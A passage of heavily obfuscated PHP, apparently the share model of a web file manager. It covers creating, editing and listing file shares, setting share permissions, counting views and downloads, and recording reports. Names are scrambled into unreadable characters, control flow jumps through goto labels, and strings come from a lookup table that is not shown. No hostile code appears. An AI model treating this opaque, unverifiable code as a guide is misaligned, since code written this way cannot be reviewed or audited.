$eÕâ”øΩ¡Ë = array($FÉÒìπΩÍ∆[1438] => USER_ID, $FÉÒìπΩÍ∆[1023] => $E≥’Úõÿî); return $this->_getShareInfo($eÕâ”øΩ¡Ë); } private function _getShareInfo($bã˜â¨æà∫) { goto DîœõÁñ≠¿; añæ°¶©À®: if ($fÙËƒó≤â“[$Fõ⁄ä¡ü˘é[369]] == $Fõ⁄ä¡ü˘é[468]) { $fÙËƒó≤â“[$Fõ⁄ä¡ü˘é[391]] = IO::info($fÙËƒó≤â“[$Fõ⁄ä¡ü˘é[1023]]); } else { $fÙËƒó≤â“[$Fõ⁄ä¡ü˘é[391]] = Model($Fõ⁄ä¡ü˘é[1121])->pathInfo($fÙËƒó≤â“[$Fõ⁄ä¡ü˘é[369]]); } $fÙËƒó≤â“[$Fõ⁄ä¡ü˘é[2217]] = $eè‹Ü–∏ƒº; return $fÙËƒó≤â“; goto c¿π£ªäã≈; dıç»Êçó§: $bã˜â¨æà∫ = array($Fõ⁄ä¡ü˘é[441] => $fÙËƒó≤â“[$Fõ⁄ä¡ü˘é[441]]); $Fäç‘ÿ–Ñá = $Fõ⁄ä¡ü˘é[2216]; $eè‹Ü–∏ƒº = Model($Fõ⁄ä¡ü˘é[537])->order($Fõ⁄ä¡ü˘é[367])->field($Fäç‘ÿ–Ñá)->where($bã˜â¨æà∫)->select(); goto añæ°¶©À®; DîœõÁñ≠¿: $Fõ⁄ä¡ü˘é =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fÙËƒó≤â“ = $this->where($bã˜â¨æà∫)->find(); if (!$fÙËƒó≤â“) { return !1; } goto dıç»Êçó§; c¿π£ªäã≈: } protected function getInfoAuth($e±ìË…æáÜ) { $DëÆªÚ§Õ‘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A‘Ù«ÿ›éÀ = $this->getInfo($e±ìË…æáÜ); $A‘Ù«ÿ›éÀ[$DëÆªÚ§Õ‘[376]] = Model($DëÆªÚ§Õ‘[454])->authMake($A‘Ù«ÿ›éÀ[$DëÆªÚ§Õ‘[2217]]); return $A‘Ù«ÿ›éÀ; } protected function listData($dã¿Üæ£¶˘ = null, $AŸàµÃÖ¥æ = 300) { $AÖÒÎ€≤Ì⁄ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B≈◊î¬¿äÖ = array(array($AÖÒÎ€≤Ì⁄[446] => array($AÖÒÎ€≤Ì⁄[930], 0), $AÖÒÎ€≤Ì⁄[448] => array($AÖÒÎ€≤Ì⁄[930], 0), $AÖÒÎ€≤Ì⁄[2218] => $AÖÒÎ€≤Ì⁄[2187])); if ($dã¿Üæ£¶˘ == $AÖÒÎ€≤Ì⁄[1872]) { $B≈◊î¬¿äÖ = array($AÖÒÎ€≤Ì⁄[446] => 1); } else { if ($dã¿Üæ£¶˘ == $AÖÒÎ€≤Ì⁄[1012]) { $B≈◊î¬¿äÖ = array($AÖÒÎ€≤Ì⁄[448] => 1); } } $B≈◊î¬¿äÖ[$AÖÒÎ€≤Ì⁄[1438]] = USER_ID; $e°ãÂä˜£§ = $this->where($B≈◊î¬¿äÖ)->selectPage($AŸàµÃÖ¥æ); return $e°ãÂä˜£§; } protected function listToMe($eö®û‰ôû¬ = 300) { goto aú•í™Ï≥û; eı–—Œå◊ì: $D∑£”√©äÓ = array($eõ´ìÔÌ—ƒ[441] => array($eõ´ìÔÌ—ƒ[384], array_keys($Aªà¬∞˘º≥))); $Cè¬øÕﬂÉï = $this->field($Dö·ﬁ„ä˘á)->where($D∑£”√©äÓ)->select(); foreach ($Cè¬øÕﬂÉï as $Cì™∫Ñóµˆ => &$bòÉ»õµüÉ) { $bòÉ»õµüÉ[$eõ´ìÔÌ—ƒ[2217]] = $Aªà¬∞˘º≥[$bòÉ»õµüÉ[$eõ´ìÔÌ—ƒ[441]]]; } goto eÕ›ß‹á™ó; eÕ›ß‹á™ó: $E˜ïè£“îâ = array($eõ´ìÔÌ—ƒ[2221] => $Cè¬øÕﬂÉï, $eõ´ìÔÌ—ƒ[2222] => $f⁄öáŒåíΩ[$eõ´ìÔÌ—ƒ[351]]); return $E˜ïè£“îâ; goto FÛ´«ï€∆¥; aú•í™Ï≥û: $eõ´ìÔÌ—ƒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Fñä®◊«Ü∞ = Session::get($eõ´ìÔÌ—ƒ[2219]); $fØöà•Âé¬ = array_to_keyvalue($Fñä®◊«Ü∞, $eõ´ìÔÌ—ƒ[33], $eõ´ìÔÌ—ƒ[2106]); goto CÇàÜÇ∑„ã; CÇàÜÇ∑„ã: $D∑£”√©äÓ = array($eõ´ìÔÌ—ƒ[521] => SourceModel::TYPE_USER, $eõ´ìÔÌ—ƒ[456] => USER_ID); if ($fØöà•Âé¬) { $D∑£”√©äÓ = array(array($eõ´ìÔÌ—ƒ[521] => SourceModel::TYPE_USER, $eõ´ìÔÌ—ƒ[456] => USER_ID), array($eõ´ìÔÌ—ƒ[521] => SourceModel::TYPE_GROUP, $eõ´ìÔÌ—ƒ[456] => array($eõ´ìÔÌ—ƒ[7], $fØöà•Âé¬)), $eõ´ìÔÌ—ƒ[2218] => $eõ´ìÔÌ—ƒ[2187]); } $f⁄öáŒåíΩ = Model($eõ´ìÔÌ—ƒ[537])->where($D∑£”√©äÓ)->selectPage($eö®û‰ôû¬); goto cÇüÆÚ¢ÁÖ; cÇüÆÚ¢ÁÖ: $Aªà¬∞˘º≥ = array_to_keyvalue_group($f⁄öáŒåíΩ[$eõ´ìÔÌ—ƒ[354]], $eõ´ìÔÌ—ƒ[441]); if (!$Aªà¬∞˘º≥) { return $f⁄öáŒåíΩ; } $Dö·ﬁ„ä˘á = $eõ´ìÔÌ—ƒ[2220]; goto eı–—Œå◊ì; FÛ´«ï€∆¥: } protected function shareAdd($aÂø≥ÇßÓî, $EÑŒ∑îÙÔô) { $bË”ª·£‰∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CƒÛ∫≤ö—ù = $this->_addShareData($aÂø≥ÇßÓî, $EÑŒ∑îÙÔô); if (!empty($EÑŒ∑îÙÔô[$bË”ª·£‰∆[2223]])) { $this->_shareAuthSet($CƒÛ∫≤ö—ù, $EÑŒ∑îÙÔô[$bË”ª·£‰∆[2223]]); } $this->shareEventAdd($aÂø≥ÇßÓî, $EÑŒ∑îÙÔô, $bË”ª·£‰∆[1015]); return $CƒÛ∫≤ö—ù; } private function shareEventAdd($f¢ı∑†Ñ˘„, $B◊±ëë¡ÀË, $eÆ¯∂ìö´ê = "\141\144\144") { goto E¢Ì–êª¥ú; E¢Ì–êª¥ú: $C¡ÁéÖΩ°‚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($eÆ¯∂ìö´ê == $C¡ÁéÖΩ°‚[1015]) { if ($B◊±ëë¡ÀË[$C¡ÁéÖΩ°‚[446]] == $C¡ÁéÖΩ°‚[83]) { Model($C¡ÁéÖΩ°‚[505])->eventShare($f¢ı∑†Ñ˘„, $C¡ÁéÖΩ°‚[2224]); } if ($B◊±ëë¡ÀË[$C¡ÁéÖΩ°‚[448]] == $C¡ÁéÖΩ°‚[83]) { Model($C¡ÁéÖΩ°‚[505])->eventShare($f¢ı∑†Ñ˘„, $C¡ÁéÖΩ°‚[2225]); } return; } $a›≈°Ø»— = $this->getInfoByPath($f¢ı∑†Ñ˘„); goto bÖéáÍå¿Ï; bâÓ◊äÃ®Ç: return; goto f‚™Ç¥˜¯ª; bÖéáÍå¿Ï: $aöŒä´ÍÍà = $C¡ÁéÖΩ°‚[2226]; if ($a›≈°Ø»—[$C¡ÁéÖΩ°‚[446]] == $C¡ÁéÖΩ°‚[468] && $B◊±ëë¡ÀË[$C¡ÁéÖΩ°‚[446]] == $C¡ÁéÖΩ°‚[83]) { $aöŒä´ÍÍà = $C¡ÁéÖΩ°‚[2224]; } if ($a›≈°Ø»—[$C¡ÁéÖΩ°‚[446]] == $C¡ÁéÖΩ°‚[83] && $B◊±ëë¡ÀË[$C¡ÁéÖΩ°‚[446]] == $C¡ÁéÖΩ°‚[468]) { $aöŒä´ÍÍà = $C¡ÁéÖΩ°‚[2227]; } goto E…ñõ”∞Óˆ; E…ñõ”∞Óˆ: if ($a›≈°Ø»—[$C¡ÁéÖΩ°‚[448]] == $C¡ÁéÖΩ°‚[468] && $B◊±ëë¡ÀË[$C¡ÁéÖΩ°‚[448]] == $C¡ÁéÖΩ°‚[83]) { $aöŒä´ÍÍà = $C¡ÁéÖΩ°‚[2225]; } if ($a›≈°Ø»—[$C¡ÁéÖΩ°‚[448]] == $C¡ÁéÖΩ°‚[83] && $B◊±ëë¡ÀË[$C¡ÁéÖΩ°‚[448]] == $C¡ÁéÖΩ°‚[468]) { $aöŒä´ÍÍà = $C¡ÁéÖΩ°‚[2228]; } Model($C¡ÁéÖΩ°‚[505])->eventShare($f¢ı∑†Ñ˘„, $aöŒä´ÍÍà); goto bâÓ◊äÃ®Ç; f‚™Ç¥˜¯ª: } private function _addShareData($C®’¯®‡ê°, $AÉ≤ò˘Ø¥ô = array()) { goto Cˆ“£È£ò“; F§®’‰√Œ§: return $Fê‚ä€Ãø„; goto C˘πé√°∑Ì; a·ßûÿàá›: $Eä›ÇœÓ≠› = array($aà„öëÁ§ê[1429] => USER_ID, $aà„öëÁ§ê[383] => $C®’¯®‡ê°, $aà„öëÁ§ê[1344] => $aà„öëÁ§ê[33], $aà„öëÁ§ê[446] => 0, $aà„öëÁ§ê[448] => 0, $aà„öëÁ§ê[1023] => $aà„öëÁ§ê[33], $aà„öëÁ§ê[295] => $aà„öëÁ§ê[33], $aà„öëÁ§ê[806] => $aà„öëÁ§ê[33], $aà„öëÁ§ê[2230] => 0, $aà„öëÁ§ê[2231] => 0, $aà„öëÁ§ê[703] => 0, $aà„öëÁ§ê[2232] => $aà„öëÁ§ê[33], $aà„öëÁ§ê[443] => $aà„öëÁ§ê[33]); $a‡©åé÷ïÖ = explode($aà„öëÁ§ê[47], $aà„öëÁ§ê[2233]); foreach ($a‡©åé÷ïÖ as $eµ†‰Î›á«) { if (!isset($AÉ≤ò˘Ø¥ô[$eµ†‰Î›á«])) { continue; } $Eä›ÇœÓ≠›[$eµ†‰Î›á«] = $AÉ≤ò˘Ø¥ô[$eµ†‰Î›á«]; } goto dâó∫éœèº; d‚©∏í⁄åå: if ($dÚôÛÒÇõª = $this->where($DÓ∞…¯õ»)->find()) { return $dÚôÛÒÇõª[$aà„öëÁ§ê[441]]; } if ($C®’¯®‡ê° == 0) { $aåÂéúé ∏ = array($aà„öëÁ§ê[28] => get_path_this($AÉ≤ò˘Ø¥ô[$aà„öëÁ§ê[75]])); } else { $aåÂéúé ∏ = Model($aà„öëÁ§ê[761])->sourceInfo($C®’¯®‡ê°); if (!$aåÂéúé ∏) { return !1; } } if (!$AÉ≤ò˘Ø¥ô[$aà„öëÁ§ê[1344]]) { $AÉ≤ò˘Ø¥ô[$aà„öëÁ§ê[1344]] = $aåÂéúé ∏[$aà„öëÁ§ê[28]]; } goto a·ßûÿàá›; dâó∫éœèº: $Fê‚ä€Ãø„ = $this->add($Eä›ÇœÓ≠›); $Aï°ÁÜ÷ƒÆ = array($aà„öëÁ§ê[443] => short_id($Fê‚ä€Ãø„)); $this->where(array($aà„öëÁ§ê[440] => $Fê‚ä€Ãø„))->save($Aï°ÁÜ÷ƒÆ); goto F§®’‰√Œ§; Cˆ“£È£ò“: $aà„öëÁ§ê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DÓ∞…¯õ» = array($aà„öëÁ§ê[383] => $C®’¯®‡ê°, $aà„öëÁ§ê[1429] => USER_ID); if ($C®’¯®‡ê° == 0) { $DÓ∞…¯õ» = array($aà„öëÁ§ê[2229] => $AÉ≤ò˘Ø¥ô[$aà„öëÁ§ê[1023]], $aà„öëÁ§ê[1429] => USER_ID); } goto d‚©∏í⁄åå; C˘πé√°∑Ì: } private function _shareAuthSet($b¡Ãîíà∑Ù, $DÖ∞ùœè›ú) { goto féÑ◊ÛΩø»; bÖåìØ¡åÈ: $cΩƒ˜≥éìÊ->where(array($aÜÇèÆî¶Ô[441] => $b¡Ãîíà∑Ù))->delete(); $AÆÂ¥Ú–ã = array(); foreach ($DÖ∞ùœè›ú as $F¡¶É˘Ãè¨) { $d‘∞ÙÈã€ = SourceModel::TYPE_USER; if ($F¡¶É˘Ãè¨[$aÜÇèÆî¶Ô[371]] == SourceModel::TYPE_GROUP) { $d‘∞ÙÈã€ = SourceModel::TYPE_GROUP; } $eôÛÀ€ç“Ã = array($aÜÇèÆî¶Ô[441] => $b¡Ãîíà∑Ù, $aÜÇèÆî¶Ô[371] => $d‘∞ÙÈã€, $aÜÇèÆî¶Ô[456] => intval($F¡¶É˘Ãè¨[$aÜÇèÆî¶Ô[456]]), $aÜÇèÆî¶Ô[2235] => 0, $aÜÇèÆî¶Ô[2236] => -1); if ($F¡¶É˘Ãè¨[$aÜÇèÆî¶Ô[2235]]) { $eôÛÀ€ç“Ã[$aÜÇèÆî¶Ô[2235]] = $F¡¶É˘Ãè¨[$aÜÇèÆî¶Ô[2235]]; } else { if ($F¡¶É˘Ãè¨[$aÜÇèÆî¶Ô[2236]]) { $eôÛÀ€ç“Ã[$aÜÇèÆî¶Ô[2236]] = $F¡¶É˘Ãè¨[$aÜÇèÆî¶Ô[2236]]; } } $AÆÂ¥Ú–ã[] = $eôÛÀ€ç“Ã; } goto Aïàû∂πìŸ; féÑ◊ÛΩø»: $aÜÇèÆî¶Ô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!is_array($DÖ∞ùœè›ú)) { return !1; } $cΩƒ˜≥éìÊ = Model($aÜÇèÆî¶Ô[2234]); goto bÖåìØ¡åÈ; Aïàû∂πìŸ: return $cΩƒ˜≥éìÊ->addAll($AÆÂ¥Ú–ã, array(), !0); goto eßâöÙÜîƒ; eßâöÙÜîƒ: } public function numViewAdd($b∫’¶è®ëò) { $F≥∑•ê⁄è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AŸ€àê°™£ = array($F≥∑•ê⁄è[440] => $b∫’¶è®ëò); $this->where($AŸ€àê°™£)->setAdd($F≥∑•ê⁄è[2230]); } public function numDownloadAdd($D≤Ÿê≥Éõ˜) { $F–∫≤ØÚèö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fÇÿ∏è˜Ò• = array($F–∫≤ØÚèö[440] => $D≤Ÿê≥Éõ˜); $this->where($fÇÿ∏è˜Ò•)->setAdd($F–∫≤ØÚèö[2231]); } protected function shareEdit($bÂƒˆ áÿÖ, $cëÁÚÉóæì) { goto f‚ê£…úÑá; f‚ê£…úÑá: $aô èÉØéñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dªé√ŒŸËÂ = $this->getInfo($bÂƒˆ áÿÖ); if (!$dªé√ŒŸËÂ) { return !1; } goto eã¨©∂ï°ª; FÙÖ∑–§ç…: if (isset($cëÁÚÉóæì[$aô èÉØéñ[2223]])) { $this->_shareAuthSet($bÂƒˆ áÿÖ, $cëÁÚÉóæì[$aô èÉØéñ[2223]]); } return !0; goto AÛÆü∫ßŸÆ; dƒ—§ô≥’Á: foreach ($cõ«ÁºÎÖﬁ as $b≈Õïö‰à£) { if (!array_key_exists($b≈Õïö‰à£, $cëÁÚÉóæì)) { continue; } $aÊ≤Ÿ∆êÖ≤[$b≈Õïö‰à£] = $cëÁÚÉóæì[$b≈Õïö‰à£]; } $this->shareEventAdd($dªé√ŒŸËÂ[$aô èÉØéñ[369]], $cëÁÚÉóæì, $aô èÉØéñ[2073]); $this->where(array($aô èÉØéñ[440] => $bÂƒˆ áÿÖ))->save($aÊ≤Ÿ∆êÖ≤); goto FÙÖ∑–§ç…; eã¨©∂ï°ª: $this->_checkLinkShare($cëÁÚÉóæì, $dªé√ŒŸËÂ); $aÊ≤Ÿ∆êÖ≤ = array(); $cõ«ÁºÎÖﬁ = explode($aô èÉØéñ[47], $aô èÉØéñ[2237]); goto dƒ—§ô≥’Á; AÛÆü∫ßŸÆ: } private function _checkLinkShare($AÚí›‹Ò¡°, $Cª≤ﬁ˜‘ç≈) { goto Fòü˘Ü√¿ä; F≥◊ùö›èë: if ($Cª≤ﬁ˜‘ç≈[$Cú¶†÷ÖŒ≈[391]][$Cú¶†÷ÖŒ≈[29]] != $Cú¶†÷ÖŒ≈[167]) { $c±ùŒÖ Ÿπ = $this->_folderReport($fÿÁË¥ôÑÓ); if (!$c±ùŒÖ Ÿπ) { return; } show_json(LNG($Cú¶†÷ÖŒ≈[2238]) . $Cú¶†÷ÖŒ≈[2239] . $c±ùŒÖ Ÿπ, !1); } $A¨ŸÇÒ˘≥é = Model($Cú¶†÷ÖŒ≈[761])->fileInfoGet($Cª≤ﬁ˜‘ç≈[$Cú¶†÷ÖŒ≈[391]][$Cú¶†÷ÖŒ≈[369]]); if (!$A¨ŸÇÒ˘≥é) { return; } goto aÑ„ßÏÒ÷; aÑ„ßÏÒ÷: $B´ä¥ºë¶∆ = $this->shareFileMeta($A¨ŸÇÒ˘≥é[$Cú¶†÷ÖŒ≈[419]]); if (isset($B´ä¥ºë¶∆[$Cú¶†÷ÖŒ≈[359]]) && $B´ä¥ºë¶∆[$Cú¶†÷ÖŒ≈[359]] == $Cú¶†÷ÖŒ≈[83]) { show_json(LNG($Cú¶†÷ÖŒ≈[2240]), !1); } goto aúºÌªÚ÷∂; Fòü˘Ü√¿ä: $Cú¶†÷ÖŒ≈ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($AÚí›‹Ò¡°[$Cú¶†÷ÖŒ≈[446]] != $Cú¶†÷ÖŒ≈[83]) { return; } $fÿÁË¥ôÑÓ = $Cª≤ﬁ˜‘ç≈[$Cú¶†÷ÖŒ≈[391]][$Cú¶†÷ÖŒ≈[369]]; goto F≥◊ùö›èë; aúºÌªÚ÷∂: } private function _folderReport($d ôÓ≥◊Ù∞) { goto B ãﬂµ∫ü¶; C–≤à∑¢àæ: $a÷Ì‡´”¬Ü = array($D•úñ›Ã¥Ω[419] => array($D•úñ›Ã¥Ω[7], $B√…Öè„£), $D•úñ›Ã¥Ω[459] => array($D•úñ›Ã¥Ω[760], "\x25{$f¨Üùı«§}\45"), $D•úñ›Ã¥Ω[397] => 0); $C≠¨ôãΩ˘◊ = Model($D•úñ›Ã¥Ω[761])->where($a÷Ì‡´”¬Ü)->field($D•úñ›Ã¥Ω[2242])->find(); if (!$C≠¨ôãΩ˘◊) { return !1; } goto aæõÈß‘æ∑; a¬ÑçŒÑäœ: $F©®Ÿ®ËÑ = array_to_keyvalue($dãäí®≥çä, $D•úñ›Ã¥Ω[33], $D•úñ›Ã¥Ω[28]); $F©®Ÿ®ËÑ[] = $C≠¨ôãΩ˘◊[$D•úñ›Ã¥Ω[28]]; return implode($D•úñ›Ã¥Ω[8], $F©®Ÿ®ËÑ); goto aµê·ëéß‹; aæõÈß‘æ∑: $D•ËÔ≤—‘˜ = substr($C≠¨ôãΩ˘◊[$D•úñ›Ã¥Ω[459]], strpos($C≠¨ôãΩ˘◊[$D•úñ›Ã¥Ω[459]], $f¨Üùı«§)); $a÷Ì‡´”¬Ü = array($D•úñ›Ã¥Ω[369] => array($D•úñ›Ã¥Ω[7], trim($D•ËÔ≤—‘˜, $D•úñ›Ã¥Ω[47]))); $dãäí®≥çä = Model($D•úñ›Ã¥Ω[761])->where($a÷Ì‡´”¬Ü)->field($D•úñ›Ã¥Ω[28])->select(); goto a¬ÑçŒÑäœ; Eœ¯ûÚØÍä: if (!$B√…Öè„£) { return !1; } $B√…Öè„£ = array_to_keyvalue($B√…Öè„£, $D•úñ›Ã¥Ω[33], $D•úñ›Ã¥Ω[419]); $f¨Üùı«§ = $D•úñ›Ã¥Ω[47] . $d ôÓ≥◊Ù∞ . $D•úñ›Ã¥Ω[47]; goto C–≤à∑¢àæ; B ãﬂµ∫ü¶: $D•úñ›Ã¥Ω =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a÷Ì‡´”¬Ü = array($D•úñ›Ã¥Ω[419] => array($D•úñ›Ã¥Ω[930], 0), $D•úñ›Ã¥Ω[689] => 3); $B√…Öè„£ = Model($D•úñ›Ã¥Ω[2241])->where($a÷Ì‡´”¬Ü)->field($D•úñ›Ã¥Ω[419])->select(); goto Eœ¯ûÚØÍä; aµê·ëéß‹: } protected function remove($a¢Ì‰⁄¨ç«) { goto c⁄˜√…≥ê°; c⁄˜√…≥ê°: $dä«®ƒ◊üÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_array($a¢Ì‰⁄¨ç«)) { $a¢Ì‰⁄¨ç« = array($dä«®ƒ◊üÑ[7], $a¢Ì‰⁄¨ç«); } $f§Ëúëìˆ« = array($dä«®ƒ◊üÑ[441] => $a¢Ì‰⁄¨ç«); goto AÜÀ¡ûÉÒä; eòﬂå´ˆ§ã: for ($a˜¬¡πÿ·ñ = 0; $a˜¬¡πÿ·ñ < count($CÇÑ¡¿∫Ôº); $a˜¬¡πÿ·ñ++) { $E∫·∑‘â∞á = $this->getInfo($CÇÑ¡¿∫Ôº[$a˜¬¡πÿ·ñ]); if ($E∫·∑‘â∞á[$dä«®ƒ◊üÑ[448]] == $dä«®ƒ◊üÑ[83]) { Model($dä«®ƒ◊üÑ[505])->eventShare($E∫·∑‘â∞á[$dä«®ƒ◊üÑ[369]], $dä«®ƒ◊üÑ[2228]); } if ($E∫·∑‘â∞á[$dä«®ƒ◊üÑ[446]] == $dä«®ƒ◊üÑ[83]) { Model($dä«®ƒ◊üÑ[505])->eventShare($E∫·∑‘â∞á[$dä«®ƒ◊üÑ[369]], $dä«®ƒ◊üÑ[2227]); } } return $dıóù±¨ê«; goto D≥ÑÿåÚ§Ü; AÜÀ¡ûÉÒä: $dıóù±¨ê« = $this->where($f§Ëúëìˆ«)->delete(); if ($dıóù±¨ê«) { Model($dä«®ƒ◊üÑ[537])->where(array($dä«®ƒ◊üÑ[441] => $a¢Ì‰⁄¨ç«))->delete(); } $CÇÑ¡¿∫Ôº = is_array($a¢Ì‰⁄¨ç«) ? $a¢Ì‰⁄¨ç«[1] : array($a¢Ì‰⁄¨ç«); goto eòﬂå´ˆ§ã; D≥ÑÿåÚ§Ü: } protected function removeBySource($d˜¢∂äÌﬁ≠) { goto bÃ··ô∫ÙÇ; aùÊâ™·†’: $bãı„öÃœƒ = array_to_keyvalue($bãı„öÃœƒ, $eΩ«œÑ∏§‰[33], $eΩ«œÑ∏§‰[441]); if (!$bãı„öÃœƒ) { return; } $aÀıó¶Ö†Ü = array($eΩ«œÑ∏§‰[440] => array($eΩ«œÑ∏§‰[384], $bãı„öÃœƒ)); goto Eëœ¥œ¡º€; Eëœ¥œ¡º€: $this->where($aÀıó¶Ö†Ü)->delete(); Model($eΩ«œÑ∏§‰[537])->where($aÀıó¶Ö†Ü)->delete(); goto d¡¿ëﬂ◊∆Ã; bÃ··ô∫ÙÇ: $eΩ«œÑ∏§‰ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aÀıó¶Ö†Ü = array($eΩ«œÑ∏§‰[383] => array($eΩ«œÑ∏§‰[384], $d˜¢∂äÌﬁ≠)); $bãı„öÃœƒ = $this->field($eΩ«œÑ∏§‰[441])->where($aÀıó¶Ö†Ü)->select(); goto aùÊâ™·†’; d¡¿ëﬂ◊∆Ã: } public function listAll($BÑ»…ﬂø€Ü) { goto CêéÓ¡∞ƒÁ; BàøÜ∑Ÿ»ß: if ($BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[702]]) { $F¿ä¯≈¶ÕÕ = $BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[703]] ? $BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[703]] : strtotime(date($dÛ˘ÉÌÍä“[2243])); $Dœ≥¯óÿõÈ[$dÛ˘ÉÌÍä“[187]] = array($dÛ˘ÉÌÍä“[321], array($BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[702]], $F¿ä¯≈¶ÕÕ)); } if ($BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[29]]) { $Dœ≥¯óÿõÈ[$BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[29]]] = 1; } else { $Dœ≥¯óÿõÈ[] = array($dÛ˘ÉÌÍä“[446] => array($dÛ˘ÉÌÍä“[930], 0), $dÛ˘ÉÌÍä“[448] => array($dÛ˘ÉÌÍä“[930], 0), $dÛ˘ÉÌÍä“[2218] => $dÛ˘ÉÌÍä“[2187]); } if ($BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[2183]]) { $Dœ≥¯óÿõÈ[] = array($dÛ˘ÉÌÍä“[443] => $BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[2183]], $dÛ˘ÉÌÍä“[1344] => array($dÛ˘ÉÌÍä“[760], "\45{$BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[2183]]}\x25"), $dÛ˘ÉÌÍä“[2218] => $dÛ˘ÉÌÍä“[2187]); } goto a•—û¯ÈÂ‡; eË´™∑…é›: return $e•ﬂ≤à∏œˆ; goto cëêÑ£¡ä“; CêéÓ¡∞ƒÁ: $dÛ˘ÉÌÍä“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dœ≥¯óÿõÈ = array(); if ($BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[1438]]) { $Dœ≥¯óÿõÈ[$dÛ˘ÉÌÍä“[1438]] = $BÑ»…ﬂø€Ü[$dÛ˘ÉÌÍä“[1438]]; } goto BàøÜ∑Ÿ»ß; a•—û¯ÈÂ‡: $e•ﬂ≤à∏œˆ = $this->_makeOrder()->where($Dœ≥¯óÿõÈ)->selectPage(20); if (empty($e•ﬂ≤à∏œˆ[$dÛ˘ÉÌÍä“[354]])) { return array(); } $this->_listDataApply($e•ﬂ≤à∏œˆ[$dÛ˘ÉÌÍä“[354]]); goto eË´™∑…é›; cëêÑ£¡ä“: } public function listDataApply($BÈÃ∆•⁄â◊) { $this->_listDataApply($BÈÃ∆•⁄â◊); return $BÈÃ∆•⁄â◊; } private function _listDataApply(&$F€™ÃÌ®È£) { $A·ÀÎòÙƒ† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aøâóÜÆòØ = array_to_keyvalue($F€™ÃÌ®È£, $A·ÀÎòÙƒ†[33], $A·ÀÎòÙƒ†[1438]); $b¿–åØƒ˘Ú = Model($A·ÀÎòÙƒ†[477])->userListInfo(array_unique($aøâóÜÆòØ)); $Dã Õèüëê = array_to_keyvalue($F€™ÃÌ®È£, $A·ÀÎòÙƒ†[33], $A·ÀÎòÙƒ†[369]); $e»Ö∑œÉóœ = Model($A·ÀÎòÙƒ†[761])->sourceListInfo($Dã Õèüëê, !0); foreach ($F€™ÃÌ®È£ as &$FªèÙ‚ ™) { $FÌê™©•æ = $FªèÙ‚ ™[$A·ÀÎòÙƒ†[1438]]; $FªèÙ‚ ™[$A·ÀÎòÙƒ†[2244]] = $b¿–åØƒ˘Ú[$FÌê™©•æ] ? $b¿–åØƒ˘Ú[$FÌê™©•æ] : !1; $c•èå˘ÜÔﬁ = $FªèÙ‚ ™[$A·ÀÎòÙƒ†[369]]; $FªèÙ‚ ™[$A·ÀÎòÙƒ†[391]] = $e»Ö∑œÉóœ[$c•èå˘ÜÔﬁ] ? $e»Ö∑œÉóœ[$c•èå˘ÜÔﬁ] : !1; } } private function _makeOrder($EÑΩõàßë⁄ = '') { goto D«»ÃÚû⁄»; D«»ÃÚû⁄»: $C‘÷§≈‘Õﬂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e¢ÑûÁûïû = array($C‘÷§≈‘Õﬂ[187], $C‘÷§≈‘Õﬂ[703], $C‘÷§≈‘Õﬂ[2230], $C‘÷§≈‘Õﬂ[2231]); $Få©¶˘éÌ¨ = array($C‘÷§≈‘Õﬂ[402] => $C‘÷§≈‘Õﬂ[403], $C‘÷§≈‘Õﬂ[404] => $C‘÷§≈‘Õﬂ[405]); goto Cî¥áà¢≥¯; Cî¥áà¢≥¯: $F„£¥‹Ç◊· = Input::get($C‘÷§≈‘Õﬂ[407], $C‘÷§≈‘Õﬂ[7], $C‘÷§≈‘Õﬂ[389], $e¢ÑûÁûïû); $BÖ‚ÜÂ›ı∫ = Input::get($C‘÷§≈‘Õﬂ[408], $C‘÷§≈‘Õﬂ[7], $C‘÷§≈‘Õﬂ[2245], array($C‘÷§≈‘Õﬂ[2182], $C‘÷§≈‘Õﬂ[404])); $BÖ‚ÜÂ›ı∫ = $Få©¶˘éÌ¨[$BÖ‚ÜÂ›ı∫]; goto eéıâü’¥Ω; eéıâü’¥Ω: $EÑΩõàßë⁄ = $EÑΩõàßë⁄ . "{$F„£¥‹Ç◊·}\x20{$BÖ‚ÜÂ›ı∫}"; return $this->order($EÑΩõàßë⁄); goto aìﬂã¡ë‰ë; aìﬂã¡ë‰ë: } public function reportAdd($Eïªÿ‡∆Ãá) { $FÁÚÛùäü∂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FöØ®í«◊≤ = array($FÁÚÛùäü∂[441] => $Eïªÿ‡∆Ãá[$FÁÚÛùäü∂[441]], $FÁÚÛùäü∂[1438] => USER_ID); if (Model($FÁÚÛùäü∂[2241])->where($FöØ®í«◊≤)->find()) { return !1; } $bÙ©Ì‘©êµ = array($FÁÚÛùäü∂[441] => $Eïªÿ‡∆Ãá[$FÁÚÛùäü∂[441]], $FÁÚÛùäü∂[1344] => $Eïªÿ‡∆Ãá[$FÁÚÛùäü∂[1344]], $FÁÚÛùäü∂[369] => $Eïªÿ‡∆Ãá[$FÁÚÛùäü∂[369]], $FÁÚÛùäü∂[419] => 